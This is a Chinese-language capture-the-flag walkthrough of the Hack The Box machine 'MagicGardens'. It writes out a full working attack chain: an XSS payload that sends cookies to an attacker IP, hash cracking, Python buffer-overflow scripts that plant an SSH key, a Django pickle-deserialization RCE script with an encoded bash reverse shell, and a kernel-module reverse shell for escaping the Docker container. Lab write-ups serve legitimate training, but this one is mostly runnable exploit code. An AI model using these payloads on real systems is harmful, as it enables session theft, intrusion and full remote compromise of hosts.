# MagicGardens

端口扫描

![image-20240807150136298](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807150136298.png)

5000端口

![image-20240807152641894](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807152641894.png)

```
http://magicgardens.htb/
```

![image-20240807150608565](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807150608565.png)



登录界面

![image-20240807151406597](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807151406597.png)

重置密码界面

![image-20240807151335108](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807151335108.png)

测试出管理员邮箱

```
admin@magicgardens.htb
```

注册一个账户

![image-20240807152045152](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807152045152.png)



登录

![image-20240807152246021](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807152246021.png)

```
.eJxrYJ2awwABtVM0ejhKi1OL8hJzU6f0sAUYpiQbpAEZxSWJJaXFU3o4gksS81ISi1Km9HCWZxZnxOdkFpdM6WGY0sMD5ibnl-aVpBZNyWDr4UxOLCqByAN5PGAeQrpUDwDB6Cvk:1sbayq:0pfutVAxpXuZpiE7H_HaBTj4WCYGEkIteSRI_6cSCwU
```

![image-20240807152703854](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807152703854.png)



/subcribe界面抓包

![image-20240807153820484](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807153820484.png)

发现域名

```
honestbank.htb
```

构建自己的flask bank app

https://github.com/sk03d/flask_bank_api

![image-20240807154302495](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807154302495.png)

在数据包中修改域名

![image-20240807154427080](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807154427080.png)

![image-20240807154441286](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807154441286.png)



成功生成自己的二维码

![image-20240807154546130](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807154546130.png)

```
34e43b844f27003525548517cf48761a.0d341bcdc6746f1d452b3f4de32357b9.</p><script>var i=new Image(); i.src="<http://10.10.16.35:4444/?cookie=>"+btoa(document.cookie);</script><p>
```

修改二维码，添加脚本获取cookie

![image-20240807155549337](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807155549337.png)



保存二维码，需要发送给管理员morty获取管理员cookie,参考

https://medium.com/@Infinite_Exploit/magicgardens-htb-htb-writeup-htb-walkthrough-season-5-65c956d588fa

利用得到的cookie登录管理员后台，在管理员后台可以得到管理员密码

```
pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=
```

用hashcat破解，得到密码

```
jonasbrothers
```



ssh登录

```
ssh morty@10.10.11.9
```

![image-20240807161355086](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807161355086.png)

还有一个用户alex

![image-20240807161518348](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807161518348.png)

查找相关进程

![image-20240807161721637](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807161721637.png)

发现有个harvest,尝试运行

![image-20240807161812847](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807161812847.png)

把这个二进制文件下载到kali,用ida反编译可以发现一个缓冲区溢出漏洞,逆向分析可知版本**1.0.3**，端口1337

https://medium.com/@Infinite_Exploit/magicgardens-htb-htb-writeup-htb-walkthrough-season-5-65c956d588fa

![image-20240807162244108](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807162244108.png)

程序运行后会开启监听

![image-20240807162346602](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807162346602.png)

![image-20240807162357267](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807162357267.png)

打印版本信息

```
echo "harvest v1.0.3" | nc 127.0.0.1 1337
```

![image-20240807162732123](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807162732123.png)

![image-20240807162740207](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807162740207.png)



缓冲区溢出利用脚本



```python
import socket

server_address = ('::1',6666)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server_address)
data = b'A'*65500
s.send(data)
```



```
strace -t -e trace=openat ./harvest server -l save.txt
```

缓冲区载荷生成脚本

```
msf-pattern_create -l 65500 > bof.txt
```

![image-20240807165303755](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807165303755.png)

```
import socket

server_address = ('::1',6666)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server_address)

data = ''
with open('bof.txt', 'rb') as f:
    data = bytearray(f.read())

replace = b"/tmp/name.txt\r"

data[65364:len(replace)] = replace

s.send(data)
```

![image-20240807165734686](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807165734686.png)

![image-20240807165745374](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807165745374.png)

bof.txt



查看偏移量

```
msf-pattern_offset -q Fu8F -l 65500
```

![image-20240807170216950](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807170216950.png)

修改脚本

```
import socket

server_address = ('::1',6666)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server_address)

data = ''
with open('bof.txt', 'rb') as f:
    data = bytearray(f.read())

replace = b"/tmp/name.txt"

s.send(data[:65372] + replace)
```

name.txt

![image-20240807170602303](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807170602303.png)

![image-20240807171042507](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807171042507.png)

Aa4A的起始地址是12

生成ssh公钥

![image-20240807171510203](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807171510203.png)

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHPKRM+oshzzdnz6WNSBB4pbidJiaAlJRWhyckTf8zi/ root@kali
```

![image-20240807171523812](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807171523812.png)

exp.py

```
import socket

server_address = ('::1',6666)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server_address)

data = bytearray(b'\n'*65403)

key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHPKRM+oshzzdnz6WNSBB4pbidJiaAlJRWhyckTf8zi/ root@kali'

replace = b"/home/alex/.ssh/authorized_keys"

sendData = data[:65372] + replace
sendData[12:12+len(key)] = key.encode()

s.send(sendData)
```

```
morty@magicgardens:~$ echo "harvest v1.0.3" > /dev/tcp/127.0.0.1/1337
morty@magicgardens:~$ python3 exp.py
```

登录

![image-20240807172539291](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807172539291.png)

查找alex用户文件发现一封邮件，里面是root向alex发来的一个auth.zip![image-20240807172740522](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807172740522.png)

内容经过base64加密

```
UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE
6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S
q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe
AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG
ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=
```

用cyberchef解密后保存为一个压缩包

![image-20240807175157200](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807175157200.png)

打开压缩包需要密码

![image-20240807175401012](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807175401012.png)

用zip2john+john爆破

![image-20240807175702849](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807175702849.png)

![image-20240807175736868](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807175736868.png)

得到密码

```
realmadrid
```

解压

![image-20240807175812805](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807175812805.png)

```
alex:$2y$05$xZTYUkg.1Ohcrf31e3whieWMBhSinB/N0fznRJSqHr4KDQIuQ0txW
```

用hashcat爆破

![image-20240807180015958](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807180015958.png)

```
$2y$05$xZTYUkg.1Ohcrf31e3whieWMBhSinB/N0fznRJSqHr4KDQIuQ0txW:diamonds
```

从邮件内容可知，这个压缩包内的密码是 docker registry的密码

用脚本包docker内容下载下来https://github.com/Syzik/DockerRegistryGrabber

```
python3 drg.py https://magicgardens.htb -U alex -P diamonds --dump magicgardens.htb
```

![image-20240807182128380](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807182128380.png)

![image-20240807183336334](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807183336334.png)



![image-20240807183734426](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807183734426.png)

https://medium.com/@Infinite_Exploit/magicgardens-htb-htb-writeup-htb-walkthrough-season-5-65c956d588fa

docker内容是几个tar.gz压缩包，其中第一个压缩包有SECRET_KEY

```
cat .env     
DEBUG=False
SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b    
```

Django-rce脚本

![image-20240807184414874](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807184414874.png)

```
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings

settings.configure(SECRET_KEY="55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b")


class CreateTmpFile(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.call,
                (['bash',
                  '-c','echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzUvMTExMSAwPiYxJw== | base64 -d | bash'],))


sess = signing.dumps(
    obj=CreateTmpFile(),
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies'
)


print(sess)
```

![image-20240807184606451](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807184606451.png)

![image-20240807184847555](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807184847555.png)

![image-20240807184902332](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807184902332.png)

拿到root shell，不过这是docker容器的shell,利用cap_sys_module存在的漏洞，反弹一个真实主机的shell，这是从dokcer容器弹回真实主机

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities?source=post_page-----65c956d588fa--------------------------------#cap_sys_module

Makefile

```
obj-m +=reverse-shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

reverse-shell.c

```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.35/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

上传到靶机

![image-20240807190016471](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807190016471.png)

![image-20240807190411321](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807190411321.png)

```
insmod reverse-shell.ko
```

![image-20240807190502837](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807190502837.png)

![image-20240807190517864](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240807190517864.png)